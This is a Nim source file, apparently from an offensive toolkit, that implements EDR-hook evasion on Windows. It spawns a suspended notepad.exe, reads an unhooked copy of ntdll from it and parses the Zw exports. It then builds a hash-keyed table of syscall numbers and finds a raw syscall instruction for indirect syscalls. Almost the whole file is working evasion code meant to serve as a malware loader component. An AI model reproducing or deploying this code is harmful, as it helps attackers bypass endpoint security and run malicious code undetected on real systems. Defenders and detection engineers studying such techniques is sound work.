{.passC:"-masm=intel".}
{.passL:"-static"}
import winim/lean
import system/memory
import tables
#[
    nim c -d:strip --opt:size -d:release -f -r syscalls.nim
]#
var
    tmp: ULONG
    res: WINBOOL
    si: STARTUPINFOEX
    pi: PROCESS_INFORMATION
    ps: SECURITY_ATTRIBUTES
    ts: SECURITY_ATTRIBUTES
    lpSize: SIZE_T


var hash:uint32 = HASH_CODE
var HashNumMap = initTable[uint32, uint8]()
var AsmSyscall:int64
var NtdllBase:int64

proc HashSyscallFuncName(bt: cstring):uint32 =
    var currhash = hash
    var i=0
    while(bt[i] != cast[char](0)):
        currhash = currhash xor (cast[ptr uint16](cast[int64](bt) + i)[] + (currhash shr 8 or currhash shl 24))
        i += 1
    return currhash

proc SaveSysCallsStub() =
    # STEP 0: get the Process Enviroment Block
    var bi: PROCESS_BASIC_INFORMATION
    res = NtQueryInformationProcess(
                -1,
                0,
                addr bi,
                cast[ULONG](sizeof(bi)),
                addr tmp)

    if res != 0:
        echo "[DEBUG] (NtQueryInformationProcess) : Failed to query created process, exiting"
        quit(0)
    let ptrPEB = cast[PPEB](cast[int64](bi.PebBaseAddress))

    var ptrInitList = cast[PVOID](cast[int64](ptrPEB.Ldr.InMemoryOrderModuleList.Flink)-0x10)

    # STEP 1: creat a new process and read a clean copy of NTDLL
    var dllbase:pointer
    var outsize:SIZE_T
    while true:
        ptrInitList = cast[ptr PVOID](ptrInitList)[]
        let LdrEntry = cast[PLDR_DATA_TABLE_ENTRY](ptrInitList)
        let tmpntdll:PWSTR = "ntdll.dll"
        if nimCmpMem(tmpntdll,cast[ptr UNICODE_STRING](LdrEntry.Reserved4.addr).Buffer,18)  == 0:
            NtdllBase = cast[int64](LdrEntry.DllBase)
            let sizeofimg = cast[array[2,int64]](LdrEntry.Reserved3)
            dllbase = alloc0(sizeofimg[1])
            si.StartupInfo.cb = sizeof(si).cint
            ps.nLength = sizeof(ps).cint
            ts.nLength = sizeof(ts).cint
            InitializeProcThreadAttributeList(NULL, 2, 0, addr lpSize)
            si.lpAttributeList = cast[LPPROC_THREAD_ATTRIBUTE_LIST](HeapAlloc(GetProcessHeap(), 0, lpSize))
            InitializeProcThreadAttributeList(si.lpAttributeList, 2, 0, addr lpSize)
            res = CreateProcess(
                NULL,
                newWideCString(r"notepad.exe"),
                ps,
                ts,
                FALSE,
                EXTENDED_STARTUPINFO_PRESENT or CREATE_SUSPENDED,
                NULL,
                NULL,
                addr si.StartupInfo,
                addr pi
            )
            if res != 1:
                echo "[DEBUG] (CreateProcess) : Failed to creat process, exiting"
                quit(0)
            echo "[*] Create process notepad.exe"
            var isRead = ReadProcessMemory(pi.hProcess,cast[LPCVOID](LdrEntry.DllBase),dllbase,sizeofimg[1],&outsize)
            if isRead:
                echo "[*] Read clean copy of ntdll from notepad.exe and kill the process"
                discard TerminateProcess(pi.hProcess,1)
                break
            else:
                echo "[DEBUG] (TerminateProcess) : Failed to kill process, exiting"
                quit(0)


    # STEP 2: save the syscalls and function name hash to a map
    var dosheader = cast[PIMAGE_DOS_HEADER](cast[int64](dllbase))
    var ntheader = cast[PIMAGE_NT_HEADERS](cast[int64](dllbase) + dosheader.e_lfanew)
    var virtualaddress = ntheader.OptionalHeader.DataDirectory[0].VirtualAddress

    var exportdirectory = cast[PIMAGE_EXPORT_DIRECTORY](cast[int64](cast[int64](dllbase) + virtualaddress))
    var uiNameArray = cast[int64](dllbase) + exportdirectory.AddressOfNames
    var uiNameOrdinals = cast[int64](dllbase) + exportdirectory.AddressOfNameOrdinals
    var uiAddressArray = cast[int64](dllbase) + exportdirectory.AddressOfFunctions
    var uiNumberOfNames = exportdirectory.NumberOfNames

    echo "[*] Get export function from clean copy of ntdll"
    var nowOrdinals:int16
    var Zw:PSTR = "Zw"
    for i in 0..uiNumberOfNames:
        var nowName:int32 = cast[ptr int32](uiNameArray)[]
        var dllname = cast[PSTR](cast[int64](dllbase) + nowName)
        nowOrdinals = cast[ptr int16](uiNameOrdinals)[]
        var uiAddressArraym = uiAddressArray + nowOrdinals * sizeof(DWORD)
        nowName = cast[ptr int32](uiAddressArraym)[]
        var dllfunc = cast[int64](cast[int64](dllbase) + nowName)
        if nimCmpMem(Zw,dllname,2) != 0:
            uiNameArray = uiNameArray + sizeof(DWORD)
            uiNameOrdinals += sizeof(WORD)
            continue
        if AsmSyscall == 0:
          var currentaddr = NtdllBase + dllfunc - cast[int64](dllbase)
          while true:
            currentaddr += 1
            if cast[ptr int16](currentaddr)[] == 0x050f:
              AsmSyscall = currentaddr
              break
        HashNumMap[HashSyscallFuncName(cast[cstring](dllname))] = cast[uint8](cast[ptr byte](dllfunc + 4)[])
        uiNameArray = uiNameArray + sizeof(DWORD)
        uiNameOrdinals += sizeof(WORD)

proc getCode(hash:uint32):uint8 =
    let code = HashNumMap[hash]
    echo "[*] Syscall code: " & code.repr
    return code

proc getAsmSyscall():int64 =
    return AsmSyscall